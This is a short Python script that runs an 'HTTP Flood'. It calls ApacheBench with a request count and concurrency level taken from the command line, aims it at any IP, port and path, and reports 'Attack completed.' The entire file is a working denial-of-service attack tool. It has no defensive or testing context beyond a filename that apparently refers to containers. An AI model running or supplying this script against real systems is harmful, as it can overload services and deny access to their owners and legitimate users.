import subprocess
import sys

def http_flood(ip, port, num_requests, concurrency, path):
    try:
        print(f"[INFO] Starting HTTP Flood on {ip}:{port}{path} with {num_requests} requests and concurrency of {concurrency}...")

        #construct ab
        url = f"http://{ip}:{port}{path}"
        cmd = [
            "ab", "-n", str(num_requests), "-c", str(concurrency), url
        ]

        #run cmd and get output
        result = subprocess.run(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)

        #print output
        print("[INFO] Attack completed.")
        print(result.stdout)
        print(result.stderr)
    except Exception as e:
        print(f"[ERROR] HTTP Flood failed: {str(e)}")

if __name__ == "__main__":
    if len(sys.argv) != 6:
        print("Usage: python3 httpFlood_Container.py <ip> <port> <num_requests> <concurrency> <path>")
        sys.exit(1)

    target_ip = sys.argv[1]
    target_port = int(sys.argv[2])
    num_requests = int(sys.argv[3])
    concurrency = int(sys.argv[4])
    request_path = sys.argv[5]

    http_flood(target_ip, target_port, num_requests, concurrency, request_path)